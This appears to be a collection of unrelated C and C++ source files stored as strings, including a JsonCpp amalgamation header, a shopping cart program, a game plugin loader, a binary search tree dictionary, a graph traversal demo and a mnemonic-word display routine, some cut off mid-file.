    "/// Json-cpp amalgamated source (http://jsoncpp.sourceforge.net/).\n/// It is intended to be used with #include \"json/json.h\"\n\n// //////////////////////////////////////////////////////////////////////\n// Beginning of content of file: LICENSE\n// //////////////////////////////////////////////////////////////////////\n\n/*\nThe JsonCpp library's source code, including accompanying documentation,\ntests and demonstration applications, are licensed under the following\nconditions...\n\nBaptiste Lepilleur and The JsonCpp Authors explicitly disclaim copyright in all\njurisdictions which recognize such a disclaimer. In such jurisdictions,\nthis software is released into the Public Domain.\n\nIn jurisdictions which do not recognize Public Domain property (e.g. Germany as of\n2010), this software is Copyright (c) 2007-2010 by Baptiste Lepilleur and\nThe JsonCpp Authors, and is released under the terms of the MIT License (see below).\n\nIn jurisdictions which recognize Public Domain property, the user of this\nsoftware may choose to accept it either as 1) Public Domain, 2) under the\nconditions of the MIT License (see below), or 3) under the terms of dual\nPublic Domain/MIT License conditions described here, as they choose.\n\nThe MIT License is about as close to Public Domain as a license can get, and is\ndescribed in clear, concise terms at:\n\n   http://en.wikipedia.org/wiki/MIT_License\n\nThe full text of the MIT License follows:\n\n========================================================================\nCopyright (c) 2007-2010 Baptiste Lepilleur and The JsonCpp Authors\n\nPermission is hereby granted, free of charge, to any person\nobtaining a copy of this software and associated documentation\nfiles (the \"Software\"), to deal in the Software without\nrestriction, including without limitation the rights to use, copy,\nmodify, merge, publish, distribute, sublicense, and/or sell copies\nof the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be\nincluded in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\nBE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\nACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\nCONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n========================================================================\n(END LICENSE TEXT)\n\nThe MIT license is compatible with both the GPL and commercial\nsoftware, affording one all of the rights of Public Domain with the\nminor nuisance of being required to keep the above copyright notice\nand license text in the source code. Note also that by accepting the\nPublic Domain \"license\" you can re-license your copy using whatever\nlicense you like.\n\n*/\n\n// //////////////////////////////////////////////////////////////////////\n// End of content of file: LICENSE\n// //////////////////////////////////////////////////////////////////////\n\n\n\n\n\n\n#include \"json/json.h\"\n\n#ifndef JSON_IS_AMALGAMATION\n#error \"Compile with -I PATH_TO_JSON_DIRECTORY\"\n#endif\n\n\n// //////////////////////////////////////////////////////////////////////\n// Beginning of content of file: src/lib_json/json_tool.h\n// //////////////////////////////////////////////////////////////////////\n\n// Copyright 2007-2010 Baptiste Lepilleur and The JsonCpp Authors\n// Distributed under MIT license, or public domain if desired and\n// recognized in your jurisdiction.\n// See file LICENSE for detail or copy at http://jsoncpp.sourceforge.net/LICENSE\n\n#ifndef LIB_JSONCPP_JSON_TOOL_H_INCLUDED\n#define LIB_JSONCPP_JSON_TOOL_H_INCLUDED\n\n#if !defined(JSON_IS_AMALGAMATION)\n#include <json/config.h>\n#endif\n\n// Also support old flag NO_LOCALE_SUPPORT\n#ifdef NO_LOCALE_SUPPORT\n#define JSONCPP_NO_LOCALE_SUPPORT\n#endif\n\n#ifndef JSONCPP_NO_LOCALE_SUPPORT\n#include <clocale>\n#endif\n\n/* This header provides common string manipulation support, such as UTF-8,\n * portable conversion from/to string...\n *\n * It is an internal header that must not be exposed.\n */\n\nnamespace Json {\nstatic inline char getDecimalPoint() {\n#ifdef JSONCPP_NO_LOCALE_SUPPORT\n  return '\\0';\n#else\n  struct lconv* lc = localeconv();\n  return lc ? *(lc->decimal_point) : '\\0';\n#endif\n}\n\n/// Converts a unicode code-point to UTF-8.\nstatic inline String codePointToUTF8(unsigned int cp) {\n  String result;\n\n  // based on description from http://en.wikipedia.org/wiki/UTF-8\n\n  if (cp <= 0x7f) {\n    result.resize(1);\n    result[0] = static_cast<char>(cp);\n  } else if (cp <= 0x7FF) {\n    result.resize(2);\n    result[1] = static_cast<char>(0x80 | (0x3f & cp));\n    result[0] = static_cast<char>(0xC0 | (0x1f & (cp >> 6)));\n  } else if (cp <= 0xFFFF) {\n    result.resize(3);\n    result[2] = static_c",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <iomanip> \nusing namespace std;\n\nstruct Item {\n    int id;\n    string name;\n    double price;\n    int quantity;\n};\nvoid addItem(vector<Item>& cart);\nvoid viewCart(const vector<Item>& cart);\nvoid calculateTotal(const vector<Item>& cart);\nvoid removeItem(vector<Item>& cart);\n\nint main() {\n    vector<Item> cart; \n    int choice;\n\n    do {\n        cout << \"\\nShopping Cart System\\n\";\n        cout << \"1. Add Item to Cart\\n\";\n        cout << \"2. View Cart\\n\";\n        cout << \"3. Calculate Total\\n\";\n        cout << \"4. Remove Item from Cart\\n\";\n        cout << \"5. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n        case 1:\n            addItem(cart);\n            break;\n        case 2:\n            viewCart(cart);\n            break;\n        case 3:\n            calculateTotal(cart);\n            break;\n        case 4:\n            removeItem(cart);\n            break;\n        case 5:\n            cout << \"Exiting the program. Goodbye!\\n\";\n            break;\n        default:\n            cout << \"Invalid choice. Please try again.\\n\";\n        }\n    } while (choice != 5);\n\n    return 0;\n}\nvoid addItem(vector<Item>& cart) {\n    Item item;\n    cout << \"Enter Item ID: \";\n    cin >> item.id;\n    cin.ignore(); \n    cout << \"Enter Item Name: \";\n    getline(cin, item.name);\n    cout << \"Enter Item Price: $\";\n    cin >> item.price;\n    cout << \"Enter Quantity: \";\n    cin >> item.quantity;\n\n    cart.push_back(item); \n    cout << \"Item added to cart successfully!\\n\";\n}\nvoid viewCart(const vector<Item>& cart) {\n    if (cart.empty()) {\n        cout << \"The cart is empty.\\n\";\n        return;\n    }\n\n    cout << \"\\nItems in Your Cart:\\n\";\n    cout << left << setw(10) << \"ID\" << setw(20) << \"Name\" << setw(10) << \"Price\" << setw(10) << \"Quantity\" << \"\\n\";\n    cout << \"-------------------------------------------------\\n\";\n    for (const auto& item : cart) {\n        cout << left << setw(10) << item.id << setw(20) << item.name << \"$\" << setw(9) << item.price << item.quantity << \"\\n\";\n    }\n}\nvoid calculateTotal(const vector<Item>& cart) {\n    if (cart.empty()) {\n        cout << \"The cart is empty. Total: $0.00\\n\";\n        return;\n    }\n\n    double total = 0;\n    for (const auto& item : cart) {\n        total += item.price * item.quantity;\n    }\n\n    cout << \"Total Price of Items in Cart: $\" << fixed << setprecision(2) << total << \"\\n\";\n}\nvoid removeItem(vector<Item>& cart) {\n    if (cart.empty()) {\n        cout << \"The cart is empty. Nothing to remove.\\n\";\n        return;\n    }\n\n    int id;\n    cout << \"Enter Item ID to Remove: \";\n    cin >> id;\n\n    for (auto it = cart.begin(); it != cart.end(); ++it) {\n        if (it->id == id) {\n            cout << \"Item \\\"\" << it->name << \"\\\" removed from the cart.\\n\";\n            cart.erase(it); \n            return;\n        }\n    }\n\n    cout << \"Item with ID \" << id << \" not found in the cart.\\n\";\n}\n",
    "#include \"skse64/PluginAPI.h\"\t\t// super\n#include \"skse64_common/skse_version.h\"\t// What version of SKSE is running?\n#include <shlobj.h>\t\t\t\t// CSIDL_MYCODUMENTS\n\n#include \"SimplyKnock.h\"\n\nstatic PluginHandle\t\t\t\t\tg_pluginHandle = kPluginHandle_Invalid;\nstatic SKSEPapyrusInterface         * g_papyrus = NULL;\n\nextern \"C\"\t{\n\n\t__declspec(dllexport) SKSEPluginVersionData SKSEPlugin_Version =\n\t{\n\n\t\tSKSEPluginVersionData::kVersion,\n\n\t\t2,\n\t\t\"SimplyKnock\",\n\n\t\t\"Chesko, anonymousthing, SilentStorm064\",\n\t\t\"\",\n\n\t\t0,\n\t\tSKSEPluginVersionData::kVersionIndependent_StructsPost629,\n\t\t{ RUNTIME_VERSION_1_6_1179_GOG, 0 },\n\n\t\t0,\t// works with any version of the script extender. you probably do not need to put anything here\n\t};\n\n\tbool SKSEPlugin_Query(const SKSEInterface * skse, PluginInfo * info)\t{\t// Called by SKSE to learn about this plugin and check that it's safe to load it\n\t\tgLog.OpenRelative(CSIDL_MYDOCUMENTS, \"\\\\My Games\\\\Skyrim Special Edition GOG\\\\SKSE\\\\SimplyKnock.log\");\n\t\tgLog.SetPrintLevel(IDebugLog::kLevel_Error);\n\t\tgLog.SetLogLevel(IDebugLog::kLevel_DebugMessage);\n\n\t\t_MESSAGE(\"SimplyKnockSKSE\");\n\n\t\t// populate info structure\n\t\tinfo->infoVersion =\tPluginInfo::kInfoVersion;\n\t\tinfo->name =\t\t\"SimplyKnock\";\n\t\tinfo->version =\t\t1;\n\n\t\t// store plugin handle so we can identify ourselves later\n\t\tg_pluginHandle = skse->GetPluginHandle();\n\n\t\tif(skse->isEditor)\n\t\t{\n\t\t\t_MESSAGE(\"loaded in editor, marking as incompatible\");\n\n\t\t\treturn false;\n\t\t}\n\n\t\t// ### do not do anything else in this callback\n\t\t// ### only fill out PluginInfo and return true/false\n\n\t\t// supported runtime version\n\t\treturn true;\n\t}\n\n\tbool SKSEPlugin_Load(const SKSEInterface * skse)\t{\t// Called by SKSE to load this plugin\n\t\t_MESSAGE(\"SimplyKnock loaded\");\n\n\t\tg_papyrus = (SKSEPapyrusInterface *)skse->QueryInterface(kInterface_Papyrus);\n\n\t\t//Check if the function registration was a success...\n\t\tbool btest = g_papyrus->Register(SimplyKnockNamespace::RegisterFuncs);\n\n\t\tif (btest) {\n\t\t\t_MESSAGE(\"Register Succeeded\");\n\t\t}\n\n\t\treturn true;\n\t}\n\n};\n",
    "/***\n* Eric Lee\n* elee144\n* 2024 Fall CSE101 PA7\n* Dictionary.cpp\n* Dictionary ADT implementation\n***/ \n\n#include<iostream>\n#include<string>\n#include<sstream>\n\n#include \"Dictionary.h\"\n\nusing namespace std;\n\nDictionary::Node::Node(keyType k, valType v){\n    key=k;\n    val = v;\n    parent = nullptr;\n    left = nullptr;\n    right = nullptr;\n}\n\nDictionary::Dictionary(){\n    nil = new Node(\"-1\",-1);\n    root = nil;\n    current = nil;\n    num_pairs = 0;\n}\n\nvoid Dictionary::preOrderCopy(Node* R, Node* N){\n    if(R==N || R == nil){\n        return;\n    }\n    setValue(R->key, R->val);\n    preOrderCopy(R->left, N);\n    preOrderCopy(R->right, N);\n}\n\nDictionary::Dictionary(const Dictionary& D){\n    nil = new Node(\"-1\",-1);\n    root = nil;\n    current = nil;\n    num_pairs = 0;\n\n    if(D.root != D.nil){\n        preOrderCopy(D.root, D.nil);\n    }\n}\n\nDictionary::~Dictionary(){\n    clear();\n    delete nil;\n}\n\nint Dictionary::size() const{\n    return num_pairs;\n}\n\nvoid Dictionary::inOrderString(std::string& s, Node* R) const{\n    if (R != nil && R!=nullptr){\n        inOrderString(s, R->left);\n        s += R->key + \" : \" + std::to_string(R->val) + \"\\n\";\n        inOrderString(s,R->right);\n    }\n}\n\nvoid Dictionary::preOrderString(std::string& s, Node* R) const{\n    if(R!=nil){\n        s += R->key + \"\\n\";\n        preOrderString(s, R->left);\n        preOrderString(s, R->right);\n    }\n}\n\nvoid Dictionary::postOrderDelete(Node* R){\n    if(R!= nil){\n        postOrderDelete(R->left),\n        postOrderDelete(R->right);\n        delete R;\n    }\n}\n\nDictionary::Node* Dictionary::findMin(Node* R){\n    if (R == nil){\n        return R;\n    }\n    Node* traveler = R;\n    while(traveler->left != nil){\n        traveler = traveler->left;\n    }\n    return traveler;\n}\n\nDictionary::Node* Dictionary::findMax(Node* R){\n    if (R == nil){\n        return R;\n    }\n    Node* traveler = R;\n    while(traveler->right != nil){\n        traveler = traveler->right;\n    }\n    return traveler;\n}\n\nvoid Dictionary::begin(){\n    if (root == nil){\n        return;\n    }\n    Node* traveler = root;\n    while(traveler->left != nil){\n        traveler = traveler->left;\n    }\n    current = traveler;\n}\n\nvoid Dictionary::end(){\n    if (root == nil){\n        return;\n    }\n    Node* traveler = root;\n    while(traveler->right != nil){\n        traveler = traveler->right;\n    }\n    current = traveler;\n}\n\nvoid Dictionary::next(){\n    if(!hasCurrent()){\n        throw std::logic_error(\"no current key not found\");\n    }\n    if(current == findMax(root)){\n        current = nil;\n        return;\n    }\n    if(current == nil){\n        return;\n    }\n    if(current->right != nil){\n        current = findMin(current->right);\n        return;\n    }else{\n        Node* y = current->parent;\n        while(y != nil and current == y->right){\n            current = y;\n            y = y->parent;\n        }\n        current = y;\n    }\n}\n\nvoid Dictionary::prev(){\n    if(!hasCurrent()){\n        throw std::logic_error(\"no current key not found\");\n    }\n    if(current == findMin(root)){\n        current = nil;\n        return;\n    }\n    if (current->left != nil){\n        current = findMax(current->left);\n    }else{\n        Node* y = current->parent;\n        while(y!=nil and current == y->left){\n            current = y;\n            y = y->parent;\n        }\n        current = y;\n    }\n}\n\nDictionary::Node* Dictionary::search(Node* R, keyType k) const{\n    if (R == nil || k == R->key){\n        return R;\n    }else if (k<R->key){\n        return search(R->left, k);\n    }else{\n        return search(R->right, k);\n    }\n}\n\nbool Dictionary::contains(keyType k) const{\n    if(search(root, k)!= nil){\n        return true;\n    }\n    else{\n        return false;\n    }\n}\n\nvalType& Dictionary::getValue(keyType k) const{\n    Node* found = search(root,k);\n    if(found != nil){\n        return found->val;\n    }else{\n        throw std::logic_error(\"key not found\");\n    }\n}\n\nbool Dictionary::hasCurrent() const{\n    if(current != nil){\n        return true;\n    }\n    else{\n        return false;\n    }\n}\n\nkeyType Dictionary::currentKey() const{\n    if(!hasCurrent()){\n        throw std::logic_error(\"no current key not found\");\n    }\n    return current->key;\n}\n\nvalType& Dictionary::currentVal() const{\n    if(!hasCurrent()){\n        throw std::logic_error(\"no current val not found\");\n    }\n    return current->val;\n}\n\nvoid Dictionary::clear(){\n    postOrderDelete(root);\n    root = nil;\n    current = nil;\n    num_pairs = 0;\n}\n\nvoid Dictionary::setValue(keyType k, valType v){\n    Node* found = search(root, k);\n    if(found != nil){\n        found->val = v;\n    }else{\n        Node* insert = new Node(k,v);\n        insert->left = nil;\n        insert->right = nil;\n        Node* y = nil;\n        Node* r = root;\n        while(r != nil){\n            y = r;\n            if(k<r->key){\n                r = r->left;\n            }\n            else{\n                r = r->right;\n            }\n        }\n        insert->parent = y;\n        if(y == nil){\n            root ",
    "#include <iomanip>\n#include \"Color.h\"\n\nColor::Color() {\n    this->r = 0;\n    this->g = 0;\n    this->b = 0;\n}\n\nColor::Color(double r, double g, double b)\n{\n    this->r = r;\n    this->g = g;\n    this->b = b;\n}\n\nColor::Color(const Color &other)\n{\n    this->r = other.r;\n    this->g = other.g;\n    this->b = other.b;\n}\n\nColor Color::operator+(const Color & rhs) const {\n    Color c;\n    c.r = r + rhs.r;\n    c.g = g + rhs.g;\n    c.b = b + rhs.b;\n    return c;\n}\n\nColor Color::operator-(const Color & rhs) const {\n    Color c;\n    c.r = r - rhs.r;\n    c.g = g - rhs.g;\n    c.b = b - rhs.b;\n    return c;\n}\n\nColor Color::operator*(double num) const {\n    Color c;\n    c.r = r*num;\n    c.g = g*num;\n    c.b = b*num;\n    return c;\n}\n\nColor Color::operator/(double num) const {\n    Color c;\n    c.r = r/num;\n    c.g = g/num;\n    c.b = b/num;\n    return c;\n}\n\nColor& Color::operator-=(const Color &other) {\n    r -= other.r;\n    g -= other.g;\n    b -= other.b;\n    return *this;\n}\n\n\nColor& Color::operator+=(const Color &other) {\n    r += other.r;\n    g += other.g;\n    b += other.b;\n    return *this;\n}\n\nColor& Color::operator*=(double scalar) {\n    r *= scalar;\n    g *= scalar;\n    b *= scalar;\n    return *this;\n\n}\n\n\n\nColor Color::round() const {\n    Color c;\n    c.r = (int)(r + 0.5);\n    c.g = (int)(g + 0.5);\n    c.b = (int)(b + 0.5);\n    return c;\n}\n\n\n\n\n\nstd::ostream &operator<<(std::ostream &os, const Color &c)\n{\n    os << std::fixed << std::setprecision(0) << \"rgb(\" << c.r << \", \" << c.g << \", \" << c.b << \")\";\n    return os;\n}\n",
    "// Qu\u1ea3n l\u00fd ng\u00e2n h\u00e0ng\r\n#include <stdio.h>\r\n#include <stdlib.h>       //de su dung srand,rand,system(\"cls\")  \r\n#include <conio.h>       //de su dung getch \r\n#include <time.h>      //de su dung time, ctime, time_t, localtime \r\n#include <string.h>    //de su dung strcmp va strcpy \r\n#include <unistd.h>    //de su dung sleep, usleep \r\n#include <ctype.h>     //de su dung isdigit , toupper \r\n#include <stdbool.h>   //de dung true, false  \r\n#include <windows.h>\r\n#include <iostream>\r\n#include<stdint.h>\r\nusing namespace std;\r\n\r\n\r\n////h\u00e0m gotoxy\r\nvoid gotoxy(SHORT x,SHORT y)//ham dua con tro toi vi tri (x,y)\r\n{\r\n    static HANDLE h = NULL;  \r\n    if(!h)\r\n        h = GetStdHandle(STD_OUTPUT_HANDLE);\r\n    COORD c = { x, y };  \r\n    SetConsoleCursorPosition(h,c);\r\n};\r\n\r\n/////////////////////////// C\u00e1c h\u00e0m t\u1ea1o \u0111\u1ed1i t\u01b0\u1ee3ng /////////////////////////////\r\n//Khai b\u00e1o ki\u1ec3u c\u1ea5u tr\u00fac l\u01b0u m\u1eadt kh\u1ea9u c\u1eeda tk admin\r\ntypedef struct info\r\n{\r\n\tchar user[50];\r\n\tchar pass[30];\r\n\tchar stk[11];\r\n\tlong long sodu;\r\n} AdminInfo; \r\nAdminInfo admin;\r\n\r\n//khai b\u00e1o c\u1ea5u tr\u00fac ng\u00e0y/th\u00e1ng/n\u0103m\r\ntypedef struct Ngay_sinh\r\n{\r\n\tint ngay;\r\n\tint thang;\r\n\tint nam;\r\n}Ngay_sinh;\r\n\r\n//// Khai b\u00e1o c\u1ea5u tr\u00fac l\u1ecbch s\u1eed s\u1ed1 d\u01b0\r\ntypedef struct Lich_Su\r\n{\r\n\tchar stk_gui[12];///stk ng\u01b0\u1eddi g\u1eedi\r\n\tchar stk_nhan[12];/// stk ng\u01b0\u1eddi nh\u1eadn\r\n\tchar ng_gui[50];/// t\u00ean ng\u01b0\u1eddi g\u1eedi\r\n\tchar ng_nhan[50];/// t\u00ean ng\u01b0\u1eddi nh\u1eadn\r\n\tlong long money;/// s\u1ed1 ti\u1ec1n\r\n\tchar time[25];/// th\u1eddi gian giao d\u1ecbch\r\n\tint code;/// m\u00e3 giao d\u1ecbch\r\n} ls;\r\n\r\n//khai b\u00e1o c\u1ea5u tr\u00fac nh\u00e2n vi\u00ean\r\ntypedef struct nvien\r\n{\r\n\tchar mnv[10];//m\u00e3 nh\u00e2n vi\u00ean\r\n\tchar tk[20];//t\u00ean t\u00e0i kho\u1ea3n\r\n\tchar mk[20];//m\u1eadt kh\u1ea9u\r\n\tchar username[50];//t\u00ean nh\u00e2n vi\u00ean\r\n\tchar sdt[11];//s\u1ed1 \u0111i\u1ec7n tho\u1ea1i\r\n\tchar diachinv[30];//\u0111\u1ecba ch\u1ec9\r\n\tchar chucvu[13];//ch\u1ee9c v\u1ee5\r\n\tNgay_sinh ngsinh;//ng\u00e0y/th\u00e1ng/n\u0103m\r\n\tlong long luong;//l\u01b0\u01a1ng\r\n\tchar stk[12];//s\u1ed1 t\u00e0i kho\u1ea3n\r\n\tlong long sodu;//s\u1ed1 d\u01b0 t\u00e0i kho\u1ea3n\r\n\tchar time[25];/// th\u1eddi gian t\u1ea1o\r\n\tint code;/// m\u00e3 pin\r\n} nvien;\r\n\r\n//khai b\u00e1o c\u1ea5u tr\u00fac kh\u00e1ch h\u00e0ng\r\ntypedef struct Khach_hang\r\n{\r\n\tchar makh[10];//m\u00e3 kh\u00e1ch h\u00e0ng\r\n\tchar tk[20];//t\u00ean t\u00e0i kho\u1ea3n\r\n\tchar mk[20];//m\u1eadt kh\u1ea9u\r\n\tchar username[50];//t\u00ean kh\u00e1ch h\u00e0ng\r\n\tchar sdt[11];//s\u1ed1 \u0111i\u1ec7n tho\u1ea1i\r\n\tchar diachikh[30];//\u0111\u1ecba ch\u1ec9\r\n\tNgay_sinh ngsinh;//ng\u00e0y/th\u00e1ng/n\u0103m\r\n\tchar stk[12];///s\u1ed1 t\u00e0i kho\u1ea3n\r\n\tlong long sodu;///s\u1ed1 d\u01b0 t\u00e0i kho\u1ea3n\r\n\tchar time[25];/// th\u1eddi gian t\u1ea1o\r\n\tint code;/// m\u00e3 pin\r\n} Khach_hang;\r\n\r\n/// Khai b\u00e1o c\u1ea5u tr\u00fac ki\u1ec3u Node l\u1ecbch s\u1eed s\u1ed1 d\u01b0\r\ntypedef struct LS\r\n{\r\n\tls lich_su;\r\n\tLS *pNext;\r\n} NodeLS;\r\n\r\n//khai b\u00e1o c\u1ea5u tr\u00fac ki\u1ec3u Node kh\u00e1ch h\u00e0ng\r\ntypedef struct KH\r\n{\r\n    Khach_hang user;\r\n    KH *pNext;\r\n}NodeKH;\r\n\r\n//khai b\u00e1o c\u1ea5u tr\u00fac ki\u1ec3u Node nh\u00e2n vi\u00ean\r\ntypedef struct NV\r\n{\r\n    nvien Nvien;\r\n    NV *pNext;\r\n}NodeNV;\r\n\r\n/// H\u00e0m t\u1ea1o Node l\u1ecbch s\u1eed\r\nNodeLS *CreateLs(ls c)\r\n{\r\n\tNodeLS *newNodeLS=new NodeLS;\r\n\tif(newNodeLS==NULL)\r\n\t{\r\n\t\tprintf(\"cap phat bo nho that bai!\");\r\n\t\texit(1);\r\n\t}\r\n\tnewNodeLS->lich_su=c;\r\n\tnewNodeLS->pNext=NULL;\r\n\treturn newNodeLS;\r\n}\r\n\r\n//// H\u00e0m \u0111\u1ebfm s\u1ed1 n\u00fat LS\r\nint countNodes(NodeLS* LS) {\r\n    int count = 0;\r\n    NodeLS* temp = LS;\r\n\r\n    while (temp != NULL) {\r\n        count++;\r\n        temp = temp->pNext; // Di chuy\u1ec3n \u0111\u1ebfn n\u00fat ti\u1ebfp theo\r\n    }\r\n\r\n    return count; // Tr\u1ea3 v\u1ec1 s\u1ed1 l\u01b0\u1ee3ng n\u00fat\r\n}\r\n\r\n/// H\u00e0m t\u1ea1o m\u1ea3ng l\u1ecbch s\u1eed\r\nint listToArrayLs(NodeLS* copiedLs, ls* arr, int* b) {\r\n    int size = 0;\r\n    while (copiedLs != NULL) {\r\n        *(arr + size) = copiedLs->lich_su; // Sao ch\u00e9p d\u1eef li\u1ec7u v\u00e0o m\u1ea3ng `arr`\r\n        *(b + size) = size;              // G\u00e1n ch\u1ec9 s\u1ed1 v\u00e0o m\u1ea3ng `b`\r\n        size++;\r\n        copiedLs = copiedLs->pNext;      // Di chuy\u1ec3n \u0111\u1ebfn n\u00fat ti\u1ebfp theo\r\n    }\r\n    return size; // Tr\u1ea3 v\u1ec1 k\u00edch th\u01b0\u1edbc c\u1ee7a m\u1ea3ng\r\n}\r\n\r\n//h\u00e0m t\u1ea1o Node kh\u00e1ch h\u00e0ng\r\nNodeKH *CreateKh(Khach_hang c)\r\n{\r\n\tNodeKH *newNodeKH = new NodeKH;\r\n\tif(newNodeKH==NULL)\r\n\t{\r\n\t\tprintf(\"cap phat bo nho that bai!\");\r\n\t\texit(1);\r\n\t}\r\n\tnewNodeKH->user=c;\r\n\tnewNodeKH->pNext=NULL;\r\n\treturn newNodeKH;\r\n}\r\n\r\n//// H\u00e0m t\u1ea1o m\u1ea3ng kh\u00e1ch h\u00e0ng\r\nvoid listToArrayKh(NodeKH* copiedKh, Khach_hang arr[],int b[],int *stt) {\r\n    int size = 0;\r\n    int i=0;\r\n    while(i<*stt){\r\n    \tb[i]=i;\r\n    \ti++;\r\n\t}\r\n    while (copiedKh != NULL) {\r\n        arr[size] = copiedKh->user; // Sao ch\u00e9p d\u1eef li\u1ec7u v\u00e0o m\u1ea3ng\r\n        size++;\r\n        copiedKh = copiedKh->pNext;\r\n    };\r\n}\r\n\r\n//h\u00e0m t\u1ea1o Node nh\u00e2n vi\u00ean\r\nNodeNV *CreateNv(nvien s)\r\n{\r\n\tNodeNV *newNodeNV = new NodeNV;\r\n\tif(newNodeNV==NULL)\r\n\t{\r\n\t\tprintf(\"cap phat bo nho that bai!\");\r\n\t\texit(1);\r\n\t}\r\n\tnewNodeNV->Nvien=s;\r\n\tnewNodeNV->pNext=NULL;\r\n\treturn newNodeNV;\r\n}\r\n\r\n/// H\u00e0m t\u1ea1o m\u1ea3ng nh\u00e2n vi\u00ean\r\nvoid listToArrayNv(NodeNV* copiedNv, nvien arr[],int b[],int *SttNv) {\r\n    int size = 0;\r\n    int i=0;\r\n    while(i<*SttNv){\r\n    \tb[i]=i;\r\n    \ti++;\r\n\t}\r\n    while (copiedNv != NULL) {\r\n        arr[size] = copiedNv->Nvien; // Sao ch\u00e9p d\u1eef li\u1ec7u v\u00e0o m\u1ea3ng\r\n        size++;\r\n        copiedNv = copiedNv->pNext;\r\n    };\r\n}\r\n\r\n//h\u00e0m gi\u1ea3i ph\u00f3ng danh s\u00e1ch kh\u00e1ch h\u00e0ng\r\nvoid FreeListKH(NodeKH* KH)\r\n{\r\n\tNodeKH* tempKH;\r\n\twhile(KH != NULL)\r\n\t{\r\n\t\ttempKH = KH;\r\n\t\tKH=KH->pNext;\r\n\t\tfree(tempKH);\r\n\t}\r\n}\r\n\r\n//h\u00e0m gi\u1ea3i ph\u00f3ng danh",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <stack>\n#include <set>\nusing namespace std;\n\n// Class to represent a graph using an edge list\nclass Graph {\nprivate:\n    vector<pair<int, int>> edges; // Edge list\n    set<int> vertices;           // Set of vertices\n\npublic:\n    // Add an edge to the graph\n    void addEdge(int u, int v) {\n        edges.push_back({u, v});\n        vertices.insert(u);\n        vertices.insert(v);\n    }\n\n    // Depth First Search (DFS) starting from a given vertex\n    // DFS traversal with sorted neighbors\nvoid DFS(int startVertex) {\n    set<int> visited;\n    stack<int> s;\n\n    s.push(startVertex);\n\n    cout << \"DFS: \";\n    while (!s.empty()) {\n        int vertex = s.top();\n        s.pop();\n\n        if (visited.find(vertex) == visited.end()) {\n            cout << vertex << \" \";\n            visited.insert(vertex);\n\n            // Collect and sort neighbors\n            vector<int> neighbors;\n            for (auto& edge : edges) {\n                if (edge.first == vertex && visited.find(edge.second) == visited.end()) {\n                    neighbors.push_back(edge.second);\n                } else if (edge.second == vertex && visited.find(edge.first) == visited.end()) {\n                    neighbors.push_back(edge.first);\n                }\n            }\n            sort(neighbors.rbegin(), neighbors.rend()); // Sort descending for stack\n\n            for (int n : neighbors) {\n                s.push(n);\n            }\n        }\n    }\n    cout << endl;\n}\n\n    // Breadth First Search (BFS) starting from a given vertex\n    void BFS(int startVertex) {\n        set<int> visited; // To keep track of visited vertices\n        queue<int> q;     // Queue for BFS traversal\n\n        q.push(startVertex);\n        visited.insert(startVertex);\n\n        cout << \"BFS: \";\n        while (!q.empty()) {\n            int vertex = q.front();\n            q.pop();\n\n            cout << vertex << \" \";\n\n            // Add all adjacent vertices to the queue\n            for (auto& edge : edges) {\n                if (edge.first == vertex && visited.find(edge.second) == visited.end()) {\n                    q.push(edge.second);\n                    visited.insert(edge.second);\n                } else if (edge.second == vertex && visited.find(edge.first) == visited.end()) {\n                    q.push(edge.first);\n                    visited.insert(edge.first);\n                }\n            }\n        }\n        cout << endl;\n    }\n\n    // Display the graph's structure\n    void Display() {\n        cout << \"Graph (Edge List):\\n\";\n        for (auto& edge : edges) {\n            cout << \"(\" << edge.first << \", \" << edge.second << \")\\n\";\n        }\n        cout << endl;\n    }\n};\n\n// Main function\nint main() {\n    Graph g;\n\n    // Add edges to the graph\n    g.addEdge(0, 1);\n    g.addEdge(0, 4);\n    g.addEdge(1, 2);\n    g.addEdge(1, 3);\n    g.addEdge(3, 4);\n\n    // Display the graph\n    g.Display();\n\n    // Perform DFS and BFS starting from vertex 0\n    g.DFS(0);\n    g.BFS(0);\n\n    return 0;\n}",
    "#include \"MnemonicSelection.h\"\n\nnamespace selections {\n\nMnemonicSelection::MnemonicSelection(CardputerView& display, CardputerInput& input)\n    : display(display), input(input) {}\n\nvoid MnemonicSelection::select(const std::vector<std::string>& mnemonic) {\n    char key = KEY_NONE;\n    size_t lastIndex = -1;\n\n    while (key != KEY_ESC_CUSTOM) {\n        if (lastIndex != currentIndex) {\n            display.displayMnemonicWord(mnemonic[currentIndex], currentIndex);\n            lastIndex = currentIndex;\n        }\n\n        key = input.handler();\n        switch (key) {\n            case KEY_ARROW_RIGHT: // Arrow right\n                if (currentIndex < mnemonic.size() - 1) {\n                    currentIndex++;\n                }\n                break;\n            case KEY_RETURN_CUSTOM: // Arrow left\n                if (currentIndex > 0) {\n                    currentIndex--;\n                }\n                break;\n        }\n    }\n\n    currentIndex = 0; // reset index\n}\n\n} // namespace selections\n",
